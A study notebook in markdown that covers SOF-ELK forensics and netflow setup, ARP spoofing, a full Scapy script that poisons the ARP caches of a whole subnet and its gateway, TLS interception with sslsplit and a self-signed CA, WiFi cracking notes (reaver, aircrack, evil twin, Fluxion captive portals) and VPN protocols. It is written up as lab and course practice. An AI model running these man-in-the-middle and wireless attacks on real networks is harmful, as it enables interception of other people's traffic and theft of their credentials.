🔺 All malicious actions are relevant to collect 🔺

🔺 PCAP files are converted to netflow and read by SOF-ELK 🔺

🔺 HTTPD logs is used in APACHE LOG FORMAT 🔺  






___
## About SOF-ELK / Security Operations and Forensics - Elasticsearch Logstash Kibana ##

Offline forensics tool.
We take off the disk data or log files and analyse on those.
More a forensics tool than monitoring tool. 
Netflows agenda, is aggregated data at least 5 minutes old.

SOF-ELK will be used for correlating forensics data.
[Phil Hagen, for SANS FOR572, Advanced Network Forensics and Analysis](https://www.youtube.com/watch?v=XTebxMBg7Q4)
___

## HOW TO SOF-ELK ##

Preferbly use ssh to connect via your preferred terminal.



Post installation as vm on host. 

Let's prepare some sample data inside SOF-ELK.
```bash
cd /home/elk_user/sample_evidence
```
```bash
sudo unzip lab-2.3_source_evidence.zip
```
```bash
cd /logstash/syslog/ 
```
```bash
unzip /home/elk_user/sample_evidence/lab-2.3_source_evidence/fw-router_logs.zip
unzip /home/elk_user/sample_evidence/lab-2.3_source_evidence/proxy_logs.zip
```

### NETFLOW DATA ###

```bash
cd /home/elk_user/
```

```bash
unzip lab-3.1_source_evidence.zip
```

```bash
cd /home/elk_user/sample_evidence/lab-3.1_source_evidence/
```

```bash
nfdump2sof-elk.sh -e 10.3.58.1 -r /home/elk_user/sample_evidence/lab-3.1_source_evidence/netflow/ -w /logstash/nfarch/lab-3.1_netflow.txt
```

### KIBANA ###

open kibana in your prefered webbrowser use the SOF-ELK ip : with port 5601

Set the timeframe to ```2013-06-08 15:00:00 to 2013-06-08 23:30:00```


## RUN NETFLOW ##

```bash
sudo nfcapd -D -p 555 -S 1 -z -I Linux-Host-1-eth0 -w netflow/
```


```bash
wget http://www.kallas.dk/nf2sof.sh ; sudo chmod +x nf2sof.sh
```


```bash
./nf2sof.sh -e 192.168.251.128 -r ./netflow/ -w ./my_netflow.txt
```

```bash
scp my_netflow.txt elk_user@192.168.186.128:/logstash/nfarch/
```


```bash
192.168.251.130:5601
```

```bash
sudo apt update
sudo apt-get install fprobe
sudo apt-get install nfdump
```



Netflow data inside SOF-ELK


### IPTABLES ###

```bash
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j LOG --log-level info --log-prefix "[IP-TABLES] ping req "
```

```bash
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT
```

```bash
sudo iptables -L
```

```bash
sudo apt-get update
```

```bash
sudo apt-get install rsyslog
```

Copy to SOF-ELK
```bash
sudo scp /var/log/syslog elk_user@192.168.251.130:/logstash/syslog/
```

### New Rules ###

```bash
sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j LOG --log-level info --log-prefix "[IP-TABLES] ping res #deny# "
```

```bash
sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROP
```
```bash
sudo iptables -L
```
```bash
sudo iptables -F
```

### NETFLOW PCAP TO SOF-ELK CONVERTER ###

```bash
cd ~
```
```bash
unzip /sample_evidence/lab-2.3_source_evidence.zip
```
```bash
cd /sample_evidence/lab-2.3_source_evidence
```
```bash
mkdir nfpcap
```
```bash
nfpcapd -r lab-2.3.pcap -l ./nfpcap/
```
```bash
nfdump2sof-elk.sh -e 192.168.117.129 -r ./nfpcap/ -w /logstash/nfarch/netflow_frompcap.txt
```

### Filter SOF_ELK ###

```bash
netflow.tcp_flags_str:"S" and network.packets <= 2 and destination.port < 80 or destination.port > 80
```

### HTTPD log ###

🔺 
STOP NETFLOW 
```bash 
pkill nfcapd
```
🔺

### The Stack ###

ELK stack 

### Elasticsearch ###

Ensure to link data and correlate data.
No need for data preparation manually. 

### Kibana ###
UI for graphical presentation of the data.

### Beats ### 
Ingest from different systems. 
We can install beats on hosts to pick up and sensor logs from multiple hosts into the ELK stack.

Logstash 
Kibana
Beats 
and others 

Centralized logs 

Helps centralize between example: 

Web servers - Admin servers - Redundant databases - Application Servers

Major outages avoid, since elastic stack is centralized logs. 

Kibana is visualisation of the logs.

Can search logs for it security issues. 

Not like Splunk. 

Core components opensource and free

end point security monitoring self host stack


### BEATS ###

Light weight way to ship logs into the stack
written in go:

Filebeat 
Packetbeat 
+ more

Logstash transform incoming data.
Beats single purpose tool. 

Logstash is more resource intensive.


Elasticsearch 

holds index of data 
holds all data itself

in production is deployed in a cluster 
with shards a b c 
redundant copies in clusters like kubernetes 


### KIBANA ### 

Web frontend, define preset dashboard for birdseye view. 


### Setup ###

VM 
Vagrant

___

## Arp Spoofing ##

Installing arpspoof for linux.
```bash
sudo apt-get update
```
```bash
sudo apt-get install dsniff
```
> Make linux act as a "router" (man in the middle).
Remove '#' commented line with the text: “net.ipv4.ip_forward = 1”.
/etc/sysctl.conf
```bash
sudo nano /etc/sysctl.conf
```
Reconfigure the kernel parameters at runtime to apply the change.
```bash
sudo sysctl -p
```

On victim ubuntu:
```bash
sudo apt install net-tools
```
Check arp table. 
```bash
sudo arp -a
```

🔻On both attacker and victim terminals.

🔺 Adjust ip addresses acordingly: 

> in my setup: Attacker IP: 172.16.196.132 | Victim IP: 172.16.196.133
> 
```bash
sudo arpspoof -i eth0 -t 172.16.196.133 172.16.196.132
```
```bash
sudo arpspoof -i eth0 -t 172.16.196.132 172.16.196.133
```

Check the ARP table again to verify that the victim ip address has been removed when arp spoofing.
```bash
sudo arp -a
```

> In my case it all i one terminal so i will use '&' to allow multiple commands running simulatniously:

```bash
sudo arpspoof -i eth0 -t 172.16.196.132 172.16.196.133 & sudo arpspoof -i eth0 -t 172.16.196.133 172.16.196.132 & sudo arp -a
```

___
## ARP Posoning with SCAPY ##

>research the arp possibilities in scapy
```python
ls(ARP)
```
> >>> ls(ARP)
hwtype     : XShortEnumField                     = ('1')
ptype      : XShortEnumField                     = ('2048')
hwlen      : FieldLenField                       = ('None')
plen       : FieldLenField                       = ('None')
op         : ShortEnumField                      = ('1')
hwsrc      : MultipleTypeField (SourceMACField, StrFixedLenField) = ('None')
psrc       : MultipleTypeField (SourceIPField, SourceIP6Field, StrFixedLenField) = ('None')
hwdst      : MultipleTypeField (MACField, StrFixedLenField) = ('None')
pdst       : MultipleTypeField (IPField, IP6Field, StrFixedLenField) = ('None')

Trying to build an ARP packet:
```python
from scapy.all import *

pkt = ARP(psrc="ff-ff-ff-ff-ff")
print(pkt.psrc)
```
> b'ff-ff-ff-ff-ff'
```python
ls(ARP)
```
https://github.com/KimiNewt/pyshark/

___
### Man In The Middle SCAPY code ### 
> Fetch the target MAC address / generate a function to handle MAC address fetching

```python
from scapy.all import * 

# Man in the middle
# 1. get mac adresses we sent arp request on eth from ip addresses


def get_mac(IP):
        packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP)
        result = srp(packet, timeout=3, verbose=0)[0]
        return result[0][1].hwsrc



MAC_target = get_mac("172.16.196.134")
print(MAC_target)
```
```python
from scapy.all import ARP, Ether, sendp, srp, conf, get_if_hwaddr
import ipaddress
import signal
import sys
import time

INTERFACE = "eth0"
NETWORK = "192.168.251.0/24"
GATEWAY_IP = "192.168.251.2"
SELF_MAC = get_if_hwaddr(INTERFACE)

def arp_scan(network_cidr, iface=INTERFACE, timeout=2):
    ip_range = ipaddress.IPv4Network(network_cidr, strict=False)
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(ip_range))
    answered, _ = srp(packet, timeout=timeout, iface=iface, verbose=False)

    devices = []
    for sent, received in answered:
        devices.append({
            "ip": received.psrc,
            "mac": received.hwsrc
        })

    return devices

def get_mac(ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(packet, timeout=2, iface=INTERFACE, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    raise Exception(f"Could not resolve MAC for {ip}")

def spoof(target_ip, target_mac, spoof_ip):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, iface=INTERFACE, verbose=False)

def restore(target_ip, target_mac, real_ip, real_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac)
    sendp(packet, iface=INTERFACE, count=5, verbose=False)

def signal_handler(sig, frame):
    print("\nRestoring network...")
    for victim in victims:
        restore(victim['ip'], victim['mac'], GATEWAY_IP, gateway_mac)
        restore(GATEWAY_IP, gateway_mac, victim['ip'], victim['mac'])
    print("ARP tables restored. Exiting.")
    sys.exit(0)

if __name__ == "__main__":
    print(f"Scanning network: {NETWORK}")
    devices = arp_scan(NETWORK)
    print("Discovered devices:")
    for d in devices:
        print(f"{d['ip']} - {d['mac']}")

    try:
        gateway_mac = get_mac(GATEWAY_IP)
    except Exception as e:
        print(f"[!] Failed to get gateway MAC: {e}")
        sys.exit(1)

    # Filter out the gateway and attacker
    victims = [d for d in devices if d['ip'] != GATEWAY_IP and d['mac'].lower() != SELF_MAC.lower()]

    if not victims:
        print("[!] No victims found.")
        sys.exit(1)

    print(f"\nGateway MAC: {gateway_mac}")
    print(f"Attacker MAC: {SELF_MAC}")

    signal.signal(signal.SIGINT, signal_handler)

    print("\n[+] Starting two-way ARP spoofing...")
    packet_count = 0

    try:
        while True:
            for victim in victims:
                spoof(victim['ip'], victim['mac'], GATEWAY_IP)         # victim thinks attacker is gateway
                spoof(GATEWAY_IP, gateway_mac, victim['ip'])           # gateway thinks attacker is victim
                packet_count += 2
            print(f"\r[+] Packets sent: {packet_count}", end="")
            time.sleep(2)
    except Exception as e:
        print(f"\n[!] Runtime error: {e}")
        signal_handler(None, None)
```

When we run the script we should observe the following arp tables ```arp -a```  
on the target machine with IP
```192.168.251.128```:

DURING ARP SPOOF:
```python
alice@alice:~$ arp -a
_gateway (192.168.251.2) at 00:0c:29:69:a8:77 [ether] on ens160
? (192.168.251.128) at 00:0c:29:69:a8:77 [ether] on ens160
? (192.168.251.1) at be:d0:74:f2:83:65 [ether] on ens160
? (192.168.251.254) at 00:50:56:e8:23:2f [ether] on ens160
alice@alice:~$ arp -a
```

AFTER AND BEFORE ARP SPOOF on Target Machine:
```python
_gateway (192.168.251.2) at 00:50:56:fd:1e:95 [ether] on ens160
? (192.168.251.128) at 00:0c:29:69:a8:77 [ether] on ens160
? (192.168.251.1) at be:d0:74:f2:83:65 [ether] on ens160
? (192.168.251.254) at 00:50:56:e8:23:2f [ether] on ens160
```

___
>🚦Redicret the traffic from port ```80``` to ```8080``` and ```443```to ```8443```

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
```

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
```

>🧻Create an appropriate self-signed certificate

```bash
sudo openssl genrsa -out ca.key 4096
```
signing all certificates
```bash
sudo openssl req -new   -x509 -days 45 -key ca.key -out ca.crt
```

Folder storing sniff-data and tmp folder
```bash
sudo mkdir /tmp/sslsplit; sudo mkdir sniff_data
```

```bash
sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S sniff_data -k ca.key -c ca.crt https 0.0.0.0 8443 tcp 0.0.0.0 8080
```

Begin arp poisoning.

OBSERVED:

```
sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S sniff_data -k ca.key -c ca.crt https 0.0.0.0 8443 tcp 0.0.0.0 8080
| Warning: -F requires a privileged operation for each connection!
| Privileged operations require communication between parent and child process
| and will negatively impact latency and performance on each connection.
SSLsplit 0.5.5 (built 2024-04-01)
Copyright (c) 2009-2019, Daniel Roethlisberger <daniel@roe.ch>
https://www.roe.ch/SSLsplit
Build info: V:FILE HDIFF:3 N:83c4edf
Features: -DHAVE_NETFILTER
NAT engines: netfilter* tproxy
netfilter: IP_TRANSPARENT IP6T_SO_ORIGINAL_DST
Local process info support: no
compiled against OpenSSL 3.0.13 30 Jan 2024 (300000d0)
rtlinked against OpenSSL 3.0.13 30 Jan 2024 (300000d0)
OpenSSL has support for TLS extensions
TLS Server Name Indication (SNI) supported
OpenSSL is thread-safe with THREADID
OpenSSL has engine support
Using SSL_MODE_RELEASE_BUFFERS
SSL/TLS protocol availability: tls10 tls11 tls12 
SSL/TLS algorithm availability: !SHA0 RSA DSA ECDSA DH ECDH EC
OpenSSL option availability: SSL_OP_NO_COMPRESSION SSL_OP_NO_TICKET SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION SSL_OP_TLS_ROLLBACK_BUG
compiled against libevent 2.1.12-stable
rtlinked against libevent 2.1.12-stable
compiled against libnet 1.1.6
rtlinked against libnet 1.1.6
compiled against libpcap n/a
rtlinked against libpcap 1.10.4 (with TPACKET_V3)
2 CPU cores detected
Generated 2048 bit RSA key for leaf certs.
SSL/TLS protocol: negotiate
proxyspecs:
- [0.0.0.0]:8080 tcp netfilter
- [0.0.0.0]:8443 ssl|http netfilter
Loaded CA: '/C=DK/ST=copenhagen/L=copenhageb/O=c/OU=c/CN=c/emailAddress=c'
SSL/TLS leaf certificates taken from:
```



___

# Ethical Hacking: Wireless Networks

## Wireless Testing

- ✅ Use Virtual Machines (VMs) for safer testing environments
- ✅ Kali Linux – preferred OS for penetration testing
- ✅ Understand computer and networking basics
- ✅ USB wireless adapters – monitor/injection capable
- ✅ WiFi Pineapple – specialized penetration device

**Tools & Considerations:**

- 🛠️ Use both commercial and open-source software
- 🔻 Testing sites can be targets for hackers
- ⚠️ Watch for conflicting software that disrupts testing
- 🔺 Powerful methods available – use responsibly
- 🔺 Practice due diligence when downloading any tools

---

## Wireless Setup

- 🌐 Router or Internet Gateway required
- 🔌 Wired ISP connection recommended for stability

---

## Wireless Speed

| Standard     | Frequency | Max Speed    |
|--------------|-----------|--------------|
| Cat 6 Cable  | Wired     | 10 Gbps      |
| 802.11ac     | 5 GHz     | Up to 2 Gbps |

### 2.4 GHz Channels

- Channel 1: 2412 MHz  
- Channel 2: 2417 MHz  
- ...  
- Channel 14: 2472 MHz

---

## Wireless Infrastructure

```
Public Internet <--> Access Point <--> Host
```

- **SSID** – Network name (should not be hidden)
- **BSSID** – MAC address of the access point

---

## Wireless Security

- 🔑 Network Key – Required for access
- 🔒 Internet Login – Authentication portal
- 🚫 MAC Filtering – Can be circumvented
- 🔐 Encryption Standards:
  - WEP (Weak)
  - WPA (Improved)
  - WPA2 (Strongest widely supported)
- 📶 WPS – Simplifies connection, but can be vulnerable

---

## MAC Filtering

**On Router Configuration:**

- ✅ Whitelist: Only allow specified MACs
- 🚫 Blacklist: Block specific MAC addresses

> ⚠️ Not a robust security method on its own

---

## Wireless Network Basics

- 📡 Uses antennas to send/receive packets
- 🔁 Cycles through channels for optimal performance
- ❌ Can cause disconnections
- 🖥️ Essential for virtualized networks
- 🔄 Converts electrical signals to radio waves
- 📈 Antenna performance rated by **dBi**
  - Positive: Strong signal
  - Negative: Weak signal (e.g., -90 dBi is poor)
- ⚡ Power measured in **dBm**

### Antenna Types

#### Yagi Antenna (Fishbone Style)

- 🎯 High unidirectional range
- 🔑 Performance depends on phase alignment of elements

#### Parabolic Antenna

- 📡 Large dish = higher gain
- 🏞️ Ideal for rural or long-distance communication

---

## Open Wireless Networks

- 🚨 Unauthorized bandwidth/data usage
- 🛡️ Launchpad for malicious internet attacks
- 🧑‍💻 Can be exploited for internal attacks (e.g., MitM)

---

## Wireless Security Protocols

### WEP – Wired Equivalent Privacy

- ❌ Not secure
- 🧩 Designed to prevent eavesdropping & ensure integrity
- ✅ Lightweight – low performance impact
- ❌ Weak encryption and key management
- ❌ Vulnerable to sniffing and RNG flaws

### WPA – Wi-Fi Protected Access

- 🔄 Uses TKIP – rotates key for each frame
- 🔐 Supports AES encryption
- ✅ Includes integrity checks and longer keys

#### WPA2 – Enhanced WPA

- 🔐 WPA2 Personal – Shared key (PSK)
- 🔐 WPA2 Enterprise – Uses RADIUS server for auth

> 🔒 WPA2 is the current standard for secure wireless networking

___

With TP-link module we can

use some commands 

WIFITE 
-mac
-aircrack

it run different attacks 

caffe latte attacks 
fake authenticatin 

and can crack IV (initial vector) 

Show cases way WEP is vulnerable 

___

WPS can also be tested

TG583 router is tested

setting wireless adapter to monitor mode 

lookig for BSSID for reaver

operating on channel 1 

running reaver to WPS attacks

generating keys and exract model manufacturer 
model number 

serial number 

m1 and m2 messags
m3 and m4 messages 

looking at rate limiting and wainting for lifting
and attempts again 
smart enough to resume session 

aftwer a while 
router will make a lock down.
WPA2 strong solution 
but WPS rate limiting is needed for more secure WPA2 level 
disable WPS to remove risk. 

___

How well is protection for WPA handshake 

WIFIT

```bash
airmon-ng start wlan0
```
SCAN 

DEVICES 
CLIENTS 
DEVICES associtated with acces point 

Press ctrl + c 
select targeet 

get into wpa attacks
checking for clients 
deauthentication 
found and 
saved as pcap file 

aircrack and dictionary "wifi.txt" 
to crack password

and can user pswd to connect to wifi. 

___

Pixiedust 

recover key
linksys nexus, 

Linksys n300 range extendor 
antenna into monitoring mode
bssid to AP 
run wash 
run reaver to specify pixiedust attack

try pin 
initate authentication handshake 
send m2 message 
verbose mode to dump hashes and nonces (set to zero) 

reaver gets pin
network key should be recoveredd 

not all ap vulnarable 

prevent with equipment is security tested 


___

# WPA3 #

2019 router on market 

essential for open networks 
WPA3 individualized encryption 
Dragonfly handshake 
use correct password to negotiate the connection encryption 

WPA2 vulnerability 

WPA3 comes with new krack preventing password almost 100 procent secure

simple connectivuty with qr code 

enhance AES-192 encryption 

## Dragonblood - on WPA3 ##

- timing leaks
- authentication bypasses
- downgrade attacks
- denial of service
- side channel attacks
- even after patched

Design issues 
- 1$ spended on amazon EC2 enough to brute force password
- History of side channel attacks
- most attack could be fixed with minor design changes

- research tools available

Wifi alliance have confirmed this WPA3 issues and vulnarbilities
some controvercy over dragonfly 
some is validated through the fixes. 

Long way to be trusted
___

## Evil Twin ##

Rogue Access Point 
been activated to attract on vary users to connect for MitM attack 
same SSID as legimate access points - stronger signal in zone 
deauth from legitimate access point 

SIGNIFICANT THREAT

Airbase-ng 

set wireless adapter into monitor mode

```bash
airmon-ng start wlan0 
```


```bash
airdump-ng wlan0mon
```
```bash
airbase-ng -a <MAC> --essid Telecom05 -c 1 wlan0mon
```

wireshark to monitor traffic 

wlan0mon

interface

see traffic 
stop capturing

rerouting traffic airbase-ng for evil twin

buy the wifi Pineapple from hack5.org

wifi testing 

Nano Tetra beeing popular 

MARK VII and ENTERPRISE 

802.11/ac addon unit 
3 antennas 
independntly 

USB-C port

172.16.42.1:1471 

access and download software 

after installing firmware

can begin setup

setup 

restrict for SSIDs
good for client facing roles 

devope and install third party 

___
Testing with WIFI pinapple 

activating as rogue access point

start harvesting client devices 

scan for access points 
default 30 seconds 

Reconnaisance 


Add MAC to filter 
PineAP tap 
HTTPeek start listening 
Man in the middle 

### Capture WPA handshakes ###

Handshakes panel
Capture WPA handshake 
and download for pcap analysis 

___
Fluxion 

runs on kali linux
get network hash 
setup 
rogues access point 

external wifi usb link 

will check missing dependencies

cd fluxion 
sudo ./fluxion.sh 

fluxion@kali: 1

scan all 2.4 ghz channels 

attack a network 
select it

select RA link wifi modem 

reset attack and configure again 
passive monitoring attack to wait for attack to be made
take recommended verfication 
and wait for 30 seconds

attacks taking place connect to network 
attack complete
valid hash added to database 

rogue AP first step complete 

obtained Hash to obtain 

select another attack 
captive portal attack inteface
create own custom user portal captive portal 
continue to attack comfast ap

select wlan0 as interface
select airreplay
cowpattty for hash verification

use handshake snooper
use cowpatty 

create new ssl certificate for portal 
use recoomenced for connectivity 

running main dashboard for captive portal 

dns service active 
ruuning as man in the middle 
___
## Bluetooth ##

vulnerabilities 
works in 2.4ghz and also zigbee
defined in IEEE 802.15.1 

master and slave 

48-biut address decive id 

OUI Organ unique identifie 

friendly names 

class one devices 1: 100m 2:10m 3: 10 cm or less

real time stream or files

slave master identify each other and pair 

send inquiry request and active address will reply 

automitic bonding with bluetooth system 

or 6-digit number displayed 

Bluetooth operating profiles 

SERIAL Port Profile (SPP)

human interface device profile (HID) 

handsfree profile (HFP)

advanced audio distribution profile (A2DP)

Audio/Video Remote control profile (AVRCP) 

Service discovery protocol offers direct support for specific ssid 
AUDIO
TCP IP HCI RFCOMM 
DATA 
L2CAP 
LINK MANAGET
DRIVER
HARDWARE [
BASEBAND
RADIO
]


___

USE bluetooth with kali 

usb configuration 
open a terminal
lsusb 
hciconfig command
hcitool scan --info --oui 

enumrate and tell what device it is 

first is iphone 
name chip set manufacture 
first 3 of addres oui 

wireless attacks 
bluetooth tools
bluelog -l command 

/tmp/live.log 

foun 3 devices 

BT scanner also tool

l2ping to check active devices  network ping 

can find hidden devics with bruteforce on hidden adresses

redfang:
fang -s -r 0CD..... < range command 

found hidden device 

hidden address close to wifi address 

run airodump 
combine wifi scanning and redfang 
detecting hidden devices straight forward

Bluesnarfer is overtaken by other tools 

go through:

lsusb 

hciconfig 

hcitool scan 

l2ping 00:11:43:...

c flag character based device 
which channelse communicationg on 

sdp tool 
phone connected on channel 11

doesnt work with new phones 


___

Wifi cracker

select monitoring interface to use 
monitor mode automatically 

FernWifi 

initialize and detect 
networks

if been cracked key will be stored 

2 options for attack 
wps pin attack 
tpg secured access point


fernwifi 
comes with its own 
finds associated names

wifi button to start attack 
found network password 

one entry in key database 

FernPro .> upgrade 

InSSIDer4 payed low cost share product
identify network strength for walk around 

Graph of signal strengths 
SSID and secure or not 
bssid mac address 
filters to limit display 
channel minimal signal strength 
extender not shown in logical display but 
indicates best channels for sender to best on 

ACRYLIC wifi 
pro version 
identifing strength network through walkaround or warrundown 
SSID vendor infomation 

right click 
add device to inventory 
keep track of home network small businesses 

WPS information 
manufacturer 
device name
model

dictionary attack against acces point 

select connectivity 
disconnect from network 

and right click to start 

network quailty

speed signal to noist 
spectrum operating 
networks requested 
device info 

associted devices can be expanded with plus sign
station view shows all bssids been identified active and inactive devices
wireless packets view / turn on packet viewing, full 
data control manage
expand packets to see the structure 
scripts tab assists with wpa and keys Seriuous companion testing >>!!!

heat map 
ekahau
free popular
HeatMapper 

commercial 

no multifloor

useful for home and business

walk saround site and click for points right click to terminate

calculate signal strength 
pentest can provide hearmapping


wireshark monitor mode 
wlan0mon 
start capturing 
connect mobile 

wireless lan summary 
wlan traffic 
summery
beacons and data 

collected traffic 
radio tap header 
beacon 
bssid
dest
source
vendor data
radio tap header 

qos control field
for delays
data sections ip 

can add keys to decrypt data 
enable decryption 
wireshark website calculate psk paste in the key 


Vistumbler

githun repository

list of minor releases 
versio6

google earth feurures 

tp link added 
scan aps 
acess points are listed
mac address and bssid
authentication

latitude and longitud
work with gps

chnnel encryption ssid


extra 2.4 ghz 
select left hand button 
graph in real time 

gps integration 
urban regin of access points 
settings gps settings 
speed and settings correct

wifi database online database 
contribute acces point data 

wifidb

5 million records 

open access points 

comm view nodes view 

protocols bar charts 

ssid singal tpe 

context window quickl
filter channel 

decryption 

commview 

can to acces points attack 

log viewer 

run attack aircrack ng

vemo switch for SOAP protocol

open network 

tcp ports 
udp

getbinary state

http xml netcat to send 
upmp services 
getbinarystate
control with netcat 
vulnerablityu 








USB UART


## 🕸️Virutal Private Networking (VPN)🕸️ ## 

Devices are typically protected on a local network, because of local ip address space not being defualt routable across the internet.

A Virtual Private Network (VPN) can be setup to securely connect and access resources on a reomte local ip address space and make resources securely availbale through network tunneling protocols, not requiring connected hosts to be on the same local ip network.

Encryption is vital to the security of the VPN when the VPN is accessed through insecure communication lines (the public internet).

Provider-provisioned VPN is isolating the provider's own network infrastruture in virtual segments. 
This allows for making segements private to other segements in the network. 
This can be implemented with weak or no security feautures 

[VPN](https://en.wikipedia.org/wiki/Virtual_private_network)
Sources for the following content origins from Scott Simpsons course on linkedin learning [Learning VPN](https://www.linkedin.com/learning/learning-vpn/how-vpn-works?resume=false&u=36836804)
___

### Routing ###

Routes determines how packets flow to different networks.
A **Layer 3 VPN** creates a new route for a virtual network adapter

### Bridging ###

**Layer 2** VPNs behave like devices that are on the same physical network.

### Encapsulation ###

Information is wrapped inside of packets that can travel between networks.
Local traffic is encapsulated to travel between client and server.

___

## Layer 2 (data link layer)💌 ##

Transmission of frames between devices
Bridged VPN 
Layer 2 virtual devices are called TAP (tap0,tap1) 


## Layer 3 (network layer)🛤️ ##

Transmission of packets (IP)
Routed VPN
Layer 3 virutal devices are called TUN (tun0, tun1)

## PPP (Point-to-Point Protocol) (Layer 2) ##

Sets up a connection between two hosts 
Creates a connection between two hosts with a virtual network adapter at each end
ISP used to crete a network link over media-like phones lines to carry ehternet frames between IP networks
Used in DSL Modems and most VPN protocols

## Key Exchange🗝️<->🗝️ ##

VPN peers exchange encryption information to establish a secure connection.

Some protocols rely on a PSK (pre-shared key) and others agree on what security keys to use when a connection is started. 

Negotiate back and forth to agress on a key exchange before setting up a secure channel.


## Forward Security🔐 ##

Also called "Perfect Forward Security".

New session keys are generated for each session used to encrypt and decrypt the data.

Prevents malicious reuse of keys for future sessions. (Go to the hybrid encryption section)

🔺 RISK : be sure to use secure and not broken protocols 🔺

## Ports🛳️ ##

Ports used by VPN protocls are the ports on the server.

Clients choose a local port to connect from.

Ports need to be opened on the server's firewall and on the any firewalls between it and the internet. 

___

## 🔺PPTP (Point-to-Point Tunneling Protocol🔺 ###

🔺 Considered obsolete because most of the ciphers it uses are easily broken🔺

🔺Top out on 128 bit encryption🔺

🔺Uses **TCP port 1723** to set up a **GRE tunnel**, through which a PPP connection **(Protocol 47)** transfers encrypted packets.🔺

🔺Most routers pass PPTP traffic without a problem. 🔺

___

## L2TP/IPsec ##

Layer 2 Tunneling Protocol over IPsec (IP security)

IPsec creates a secure channel through which an L2TP tunnel transfers data.

# [L2TP](https://en.wikipedia.org/wiki/Layer_2_Tunneling_Protocol) #
Encapsulates Layer 2 traffic to travel over Layer 3 (IP) (normally not possible)
Allows Ethernet Bridging over the internet
No security

# [IPsec](https://en.wikipedia.org/wiki/IPsec) #
Creates a secure connection
Only carries IP traffic

## Making an [L2TP](https://en.wikipedia.org/wiki/Layer_2_Tunneling_Protocol)/[IPsec](https://en.wikipedia.org/wiki/IPsec) Connection ##

IPsec uses IKE (Internet Key Exchange) via UDP port 500 to negotiate a Security Association (SA) 

UDP port 4500 for NAT traversal mode

SA sets up ESP (Encapsulating Security Payload; protocol 50) to encrypt packets.

L2TP tunnel is established through TCP port 1701, to pass traffic protected with ESP

PPP establishes virtual network interface with IP addresses at each end.

👱‍♀️
Uses user authentication and machine-level shared secret or certificate
may need group name based on system admin setup.

✔️ Good choice for security and is widely available

Useful if you need to transfer Layer 2 data instead of just Layer 3 data.

# IKEv2 #
Internet Key Exchange, version 2

IKEv2 manages the SA for an IPsec connection

Uses UDP port 500 and UDP port 4500 for NAT traversal (supports 256 bit encryption) 

IPsec provides Layer 3 connectivity (IP)

💲MOBIKE feature provides quick reconnection - great for mobile devices📴💲

Uses user authentication, shared secret or certificate and a remote ID

___

## [OpenVPN](https://en.wikipedia.org/wiki/OpenVPN) ##

Open-source software and protocol.

Uses OpenSSL library to handle key exchange via **SSL/TLS** (offers 256 bit encryption) 

Creates a Layer 2 or Layer 3 connection. 

Via custom security protocol based on TLS. 

Uses TCP port 1194 by default, can be changed to other UDP/TCP ports. 

Works well through NAT and proxies.

✔️✔️ Widely recommended


___
### Other Protocols ###

## [Secure Socket Tunneling Protocol](https://en.wikipedia.org/wiki/Secure_Socket_Tunneling_Protocol) ##

Creates a secure channel using **SSL/TLS**

Uses **TCP port 443**

Fairly wide support 

Creates a client-network connection

## [WireGuard](https://www.wireguard.com) ##

Software and protocol (offers high security) 

Out-of-band key exchange (keys are assigned to peers in configuration)

Creates Layer 2 and Layer 3 connections over IP

Packets are encrypted with the public key of the destination host

Open source, with a goal of easy auditability

Not considered finalized (yet) [WireGuard.com](https://www.wireguard.com)

## [SoftEther](https://en.wikipedia.org/wiki/SoftEther_VPN) ##

Software Ethernet

Offers IPsec, SSTP, and other protocols, in addition to its own protocol

Sends traffic through HTTPS

Offers Layer 2 and Layer 3 connections

Creates virtualized Ethernet devices

Open source [softether.com](https://www.softether.org)


___

## [SSH](https://en.wikipedia.org/wiki/Secure_Shell) FORWARDING ##

Secure Shell 

Create a connection to an SSH server for port forwarding

Uses TCP port 22 but can use other ports 

Can forward a local port to a remote port (connect localhost:8080 to server:80)

Some implementations can open a local port and act as a SOCKS proxy sending traffic to the server


SSH doesnt create network interfaces 

Very useful for certain cases 

Widespored and difficult to block


___


🚦For practical implementation show casing🚦

Two Virtual Machines: 

One is publicly accesible and other is not.
A webpage that is not directly accesible from the public internet will be accessed through a VPN. 

___

The guide will be following:
[Algo VPN](https://github.com/trailofbits/algo)


Source of truth [Algo Cloud Deployment Guide](https://github.com/trailofbits/algo?tab=readme-ov-file#deploy-the-algo-server)
On cloudshell perform in the Command Line Interface:

download algo zip file
```bash
wget https://github.com/trailofbits/algo/archive/master.zip
```
unpack using 
```bash
unzip master.zip
```
move into directory
```bash
cd algo-master
```

```bash
sudo apt install -y --no-install-recommends python3-virtualenv file lookup
```

```bash
python3 -m virtualenv --python="$(command -v python3)" .env &&
  source .env/bin/activate &&
  python3 -m pip install -U pip virtualenv &&
  python3 -m pip install -r requirements.txt
```
open config.cfg file
```bash
nano config.cfg
```
cofigure the following usernames to be created:
```txt
users:umbers should be escaped in d>
  - phone
  - laptop
  - desktop
```
To match: 
```txt
users:umbers should be escaped in d>
  - ssorskov
```
save and exit (control + x)

run the last step with the algo command:

```bash
./algo
```
answer the question with pressing ```12``` for installing to existing ubuntu server:
Then press enter on the rest until:

Enter the public IP address or domain name of your server: (IMPORTANT! This is used to verify the certificate)
[localhost]:


enter the public address of your algo cloud server.





___

Algo allows different clients to connect. 

iOS devices.


___

Setup a connection that allows for connection acroos the internet.

___

## Windows Network Services ##

Source of truth : Network Security Assesment 

